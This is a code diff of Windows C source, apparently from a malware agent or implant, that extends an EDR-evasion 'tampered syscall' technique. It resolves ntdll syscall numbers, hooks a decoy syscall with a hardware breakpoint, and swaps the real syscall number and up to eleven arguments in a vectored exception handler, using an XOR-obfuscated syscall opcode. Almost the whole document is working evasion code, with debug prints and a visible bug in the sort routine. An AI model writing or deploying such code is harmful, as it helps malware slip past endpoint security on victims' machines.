@@ -10,11 +10,12 @@
 #include <stdio.h>
 
 pSYS_ENTRY_LIST g_SyscallList = NULL;
+pBENIGN_ENTRY_LIST g_BenignSyscallList = NULL;
 TAMPERED_SYSCALL g_TamperedSyscall = { 0 };
 CRITICAL_SECTION g_CriticalSection = { 0 };
 PVOID g_VehHandler = NULL;
 LONG ExceptionHandlerCallbackRoutine(IN PEXCEPTION_POINTERS pExceptionInfo);
-volatile unsigned short g_SYSCALL_OPCODE = 0x262A; // 0x050F ^ 0x2325
+volatile unsigned short g_SYSCALL_OPCODE = 0x405D; // 0x050F ^ 0x2325
 
 BOOL PopulateSyscallList() {
 
@@ -24,7 +25,7 @@ BOOL PopulateSyscallList() {
     PWORD				        pwFunctionOrdinalArray		= NULL;
 
     if(g_SyscallList == NULL)
-        g_SyscallList = (pSYS_ENTRY_LIST)agent->apis->pLocalAlloc(LPTR, sizeof(SYS_ENTRY_LIST)); // we already have memory reserved for our list
+        g_SyscallList = (pSYS_ENTRY_LIST)agent->apis->pLocalAlloc(LPTR, sizeof(SYS_ENTRY_LIST)); // we do not already have memory reserved for our list
 
     if(g_SyscallList->u32Count)
         return TRUE; // our list is already populated
@@ -70,6 +71,71 @@ BOOL PopulateSyscallList() {
     return TRUE; // populated and sorted.
 }
 
+BOOL PopulateBenignSyscallList() {
+    PIMAGE_EXPORT_DIRECTORY		pExportDirectory		        = NULL;
+    PDWORD				        pdwFunctionNameArray		    = NULL;
+    PDWORD				        pdwFunctionAddressArray		= NULL;
+    PWORD				        pwFunctionOrdinalArray		= NULL;
+
+    if(g_BenignSyscallList == NULL)
+        g_BenignSyscallList = (pBENIGN_ENTRY_LIST)agent->apis->pLocalAlloc(LPTR, sizeof(BENIGN_ENTRY_LIST)); // we do not already have memory reserved for our list
+
+    if(g_BenignSyscallList->u32Count)
+        return TRUE; // our list is already populated
+
+    pExportDirectory = GetExportDirectoryAddress(agent->apis->hNtdll);
+
+    pdwFunctionNameArray	= (PDWORD)((LPBYTE)agent->apis->hNtdll + pExportDirectory->AddressOfNames);
+    pdwFunctionAddressArray	= (PDWORD)((LPBYTE)agent->apis->hNtdll + pExportDirectory->AddressOfFunctions);
+    pwFunctionOrdinalArray	= (PWORD)((LPBYTE)agent->apis->hNtdll + pExportDirectory->AddressOfNameOrdinals);
+
+    //populate our list of benign syscalls.
+    for(int i = 0; i < pExportDirectory->NumberOfNames; i++) {
+        LPSTR pFunctionName = (LPSTR)((LPBYTE)agent->apis->hNtdll + pdwFunctionNameArray[i]);
+        if(*(unsigned short*)pFunctionName == 'wZ') {
+            g_BenignSyscallList->Entries[g_BenignSyscallList->u32Count].dw64Hash	= Rotr64HashA(pFunctionName);
+            g_BenignSyscallList->Entries[g_BenignSyscallList->u32Count].uAddress	= (ULONG_PTR)((LPBYTE)agent->apis->hNtdll + pdwFunctionAddressArray[pwFunctionOrdinalArray[i]]);
+
+
+            for(int i = 0; i< 0x20; i++) {
+                g_BenignSyscallList->Entries[g_BenignSyscallList->u32Count].SSN = *(unsigned short*)(g_BenignSyscallList->Entries[g_BenignSyscallList->u32Count].uAddress + i);
+                if((g_BenignSyscallList->Entries[g_BenignSyscallList->u32Count].SSN & 0x00B8) == 0x00B8) {
+                    g_BenignSyscallList->Entries[g_BenignSyscallList->u32Count].SSN = *(unsigned short*)(g_BenignSyscallList->Entries[g_BenignSyscallList->u32Count].uAddress + i + 1);
+                    break;
+                }
+            }
+
+            g_BenignSyscallList->u32Count++;
+        }
+    }
+
+    // sort our list of benign syscalls by SSN instead of address.
+    // bubble sort SSNs. This will inherently give us the addresses in the correct order.
+    // additionally, the SSN will become the index of the syscall in the list.
+    // when we randomly choose a benign syscall to hook, we will use the SSN as the index.
+    for (int i = 0; i < g_BenignSyscallList->u32Count - 0x01; i++){
+
+        for (int j = 0; j < g_BenignSyscallList->u32Count - i - 0x01; j++){
+
+            if (g_BenignSyscallList->Entries[j].SSN > g_BenignSyscallList->Entries[j + 1].SSN) {
+
+                BENIGN_SYSCALL_ENTRY TempEntry = { .dw64Hash = g_BenignSyscallList->Entries[j].dw64Hash, .uAddress = g_SyscallList->Entries[j].uAddress, .SSN = g_BenignSyscallList->Entries[j].SSN };
+
+                g_BenignSyscallList->Entries[j].dw64Hash = g_BenignSyscallList->Entries[j + 1].dw64Hash;
+                g_BenignSyscallList->Entries[j].uAddress = g_BenignSyscallList->Entries[j + 1].uAddress;
+                g_BenignSyscallList->Entries[j].SSN = g_BenignSyscallList->Entries[j + 1].SSN;
+
+                g_BenignSyscallList->Entries[j + 1].dw64Hash = TempEntry.dw64Hash;
+                g_BenignSyscallList->Entries[j + 1].uAddress = TempEntry.uAddress;
+                g_BenignSyscallList->Entries[j + 1].SSN = TempEntry.SSN;
+
+            }
+        }
+    }
+
+    return TRUE;
+}
+
 DWORD FetchSSNFromSyscallEntries(DWORD64 dw64Hash) {
 
     if(!PopulateSyscallList())
@@ -83,7 +149,9 @@ DWORD FetchSSNFromSyscallEntries(DWORD64 dw64Hash) {
     return 0x00;
 }
 
-VOID PopulateTamperedSyscall(ULONG_PTR uParam1, ULONG_PTR uParam2, ULONG_PTR uParam3, ULONG_PTR uParam4, DWORD dwSyscallNumber) {
+VOID PopulateTamperedSyscall(ULONG_PTR uParam1, ULONG_PTR uParam2, ULONG_PTR uParam3, ULONG_PTR uParam4,
+    ULONG_PTR uParam5, ULONG_PTR uParam6, ULONG_PTR uParam7, ULONG_PTR uParam8, ULONG_PTR uParam9, ULONG_PTR uParamA,
+    ULONG_PTR uParamB, DWORD dwSyscallNumber, INT Nargs) {
 
     EnterCriticalSection(&g_CriticalSection);
     //TODO : add support for handling more than 4 parameters. Since the stack is involved at that point you'll likley need to handle it with ASM function during callback.
@@ -91,7 +159,15 @@ VOID PopulateTamperedSyscall(ULONG_PTR uParam1, ULONG_PTR uParam2, ULONG_PTR uPa
     g_TamperedSyscall.uParam2 = uParam2;
     g_TamperedSyscall.uParam3 = uParam3;
     g_TamperedSyscall.uParam4 = uParam4;
+    g_TamperedSyscall.uParam5 = uParam5;
+    g_TamperedSyscall.uParam6 = uParam6;
+    g_TamperedSyscall.uParam7 = uParam7;
+    g_TamperedSyscall.uParam8 = uParam8;
+    g_TamperedSyscall.uParam9 = uParam9;
+    g_TamperedSyscall.uParamA = uParamA;
+    g_TamperedSyscall.uParamB = uParamB;
     g_TamperedSyscall.dwSyscallNumber = dwSyscallNumber;
+    g_TamperedSyscall.Nargs = Nargs;
 
     LeaveCriticalSection(&g_CriticalSection);
 
@@ -166,7 +242,7 @@ BOOL InstallHardwareBreakpointHook(_In_ DWORD dwThreadID, _In_ ULONG_PTR uTarget
     return bResult;
 }
 
-BOOL InitializeTamperedSyscall(_In_ ULONG_PTR uCalledSyscallAddress, _In_ DWORD64 FunctionHash, _In_ ULONG_PTR uParam1, _In_ ULONG_PTR uParam2, _In_ ULONG_PTR uParam3, _In_ ULONG_PTR uParam4) {
+BOOL InitializeTamperedSyscall(_In_ ULONG_PTR uCalledSyscallAddress, _In_ DWORD64 FunctionHash, _In_ INT Nargs,  _In_ ULONG_PTR uParam1, _In_ ULONG_PTR uParam2, _In_ ULONG_PTR uParam3, _In_ ULONG_PTR uParam4, ULONG_PTR uParam5, ULONG_PTR uParam6, ULONG_PTR uParam7, ULONG_PTR uParam8, ULONG_PTR uParam9, ULONG_PTR uParamA, ULONG_PTR uParamB) {
 
    if(!uCalledSyscallAddress || !FunctionHash)
        return FALSE;
@@ -176,7 +252,7 @@ BOOL InitializeTamperedSyscall(_In_ ULONG_PTR uCalledSyscallAddress, _In_ DWORD6
 
     for(int i = 0; i < 0x20; i++) {
         unsigned short opcodes = *(unsigned short*)(uCalledSyscallAddress + i);
-        if(opcodes == (0x2325 ^ g_SYSCALL_OPCODE)) {
+        if(opcodes == (0x4552 ^ g_SYSCALL_OPCODE)) {
             pDecoySyscallInstructionAdd = (PVOID)(uCalledSyscallAddress + i);
             break;
         }
@@ -188,7 +264,7 @@ BOOL InitializeTamperedSyscall(_In_ ULONG_PTR uCalledSyscallAddress, _In_ DWORD6
     if(!(dwRealSyscallNumber = FetchSSNFromSyscallEntries(FunctionHash)))
         return FALSE;
 
-    PopulateTamperedSyscall(uParam1, uParam2, uParam3, uParam4, dwRealSyscallNumber);
+    PopulateTamperedSyscall(uParam1, uParam2, uParam3, uParam4, uParam5, uParam6, uParam7, uParam8, uParam9, uParamA, uParamB, dwRealSyscallNumber, Nargs);
 
     if(!InstallHardwareBreakpointHook(GetCurrentThreadId(), (ULONG_PTR)pDecoySyscallInstructionAdd))
         return FALSE;
@@ -207,6 +283,12 @@ LONG ExceptionHandlerCallbackRoutine(IN PEXCEPTION_POINTERS pExceptionInfo) {
 
     EnterCriticalSection(&g_CriticalSection);
 
+    printf("[info ssn] : 0x%llu\n", (DWORD64)g_TamperedSyscall.dwSyscallNumber);
+    printf("[info param1] : 0x%llx\n", (DWORD64)g_TamperedSyscall.uParam1);
+    printf("[info param2] : 0x%llx\n", (DWORD64)g_TamperedSyscall.uParam2);
+    printf("[info param3] : 0x%llx\n", (DWORD64)g_TamperedSyscall.uParam3);
+    printf("[info param4] : 0x%llx\n", (DWORD64)g_TamperedSyscall.uParam4);
+
     //TODO : add support for 32bit processes.
     //Replace Decoy SSN
     pExceptionInfo->ContextRecord->Rax = (DWORD64)g_TamperedSyscall.dwSyscallNumber;
@@ -215,13 +297,55 @@ LONG ExceptionHandlerCallbackRoutine(IN PEXCEPTION_POINTERS pExceptionInfo) {
     pExceptionInfo->ContextRecord->Rdx = (DWORD64)g_TamperedSyscall.uParam2;
     pExceptionInfo->ContextRecord->R8 = (DWORD64)g_TamperedSyscall.uParam3;
     pExceptionInfo->ContextRecord->R9 = (DWORD64)g_TamperedSyscall.uParam4;
+
+    //stack content BEFORE the swap
+    printf("stack content before modification\n");
+    printf("[info] rsp : 0x%llx\n", pExceptionInfo->ContextRecord->Rsp);
+    printf("[info] RSP+8 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x08));
+    printf("[info] RSP+10 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x10));
+    printf("[info] RSP+18 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x18));
+    printf("[info] RSP+20 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x20));
+    printf("[info] RSP+28 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x28));
+    printf("[info] RSP+30 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x30));
+    printf("[info] RSP+38 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x38));
+    printf("[info] RSP+40 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x40));
+    printf("[info] RSP+48 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x48));
+    printf("[info] RSP+50 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x50));
+    printf("[info] RSP+58 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x58));
+
+
+    // replace decoy parms on stack if needed.
+    if(g_TamperedSyscall.Nargs > 4) {
+        printf("stack content after modification\n");
+        *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x28) = (DWORD64)g_TamperedSyscall.uParam5;
+        *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x30) = (DWORD64)g_TamperedSyscall.uParam6;
+        *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x38) = (DWORD64)g_TamperedSyscall.uParam7;
+        *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x40) = (DWORD64)g_TamperedSyscall.uParam8;
+        *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x48) = (DWORD64)g_TamperedSyscall.uParam9;
+        *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x50) = (DWORD64)g_TamperedSyscall.uParamA;
+        *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x58) = (DWORD64)g_TamperedSyscall.uParamB;
+
+        printf("[info] rsp : 0x%llx\n", pExceptionInfo->ContextRecord->Rsp);
+        printf("[info] RSP+8 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x08));
+        printf("[info] RSP+10 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x10));
+        printf("[info] RSP+18 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x18));
+        printf("[info] RSP+20 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x20));
+        printf("[info] RSP+28 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x28));
+        printf("[info] RSP+30 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x30));
+        printf("[info] RSP+38 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x38));
+        printf("[info] RSP+40 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x40));
+        printf("[info] RSP+48 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x48));
+        printf("[info] RSP+50 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x50));
+        printf("[info] RSP+58 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x58));
+    }
+
+
     //remove breakpoint
     pExceptionInfo->ContextRecord->Dr0 = 0ull;
 
 
-    printf("[info] rbp : 0x%llx\n", pExceptionInfo->ContextRecord->Rbp);
-    printf("[info] rsp : 0x%llx\n", pExceptionInfo->ContextRecord->Rsp);
-    printf("[info] address of return address : 0x%p\n", _AddressOfReturnAddress());
+
+
 
     LeaveCriticalSection(&g_CriticalSection);
 
@@ -230,3 +354,4 @@ LONG ExceptionHandlerCallbackRoutine(IN PEXCEPTION_POINTERS pExceptionInfo) {
     _EXIT_ROUTINE:
     return (bResolved ? EXCEPTION_CONTINUE_EXECUTION : EXCEPTION_CONTINUE_SEARCH);
 }
+
